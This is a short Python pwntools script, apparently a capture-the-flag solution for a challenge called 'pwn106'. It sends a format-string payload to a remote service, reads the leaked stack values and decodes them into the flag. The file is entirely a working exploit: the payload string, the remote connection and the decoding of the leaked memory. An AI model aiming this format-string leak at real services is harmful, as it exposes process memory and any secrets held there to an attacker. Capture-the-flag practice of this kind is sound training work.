#!/usr/bin/env python3

from pwn import *

binary=context.binary=ELF("./pwn106user.pwn106-user")
#context.log_level="debug"


#(rdi)  rsi , rdx , rcx , r8 , r9 , then stack is leaked.
payloads="%6$lx.%7$lx.%8$lx.%9$lx.%10$lx.%11$lx"

#p=process()
p=remote("10.10.5.50",9006)
p.recv()
p.recv()

p.sendline(payloads)

output=p.recv().strip().split(b" ")[1].split(b".")

flag=""
for word in output:
	flag+=bytes.fromhex(word.decode("utf-8"))[::-1].decode("utf-8")
print("The flag is :{}",format(flag))
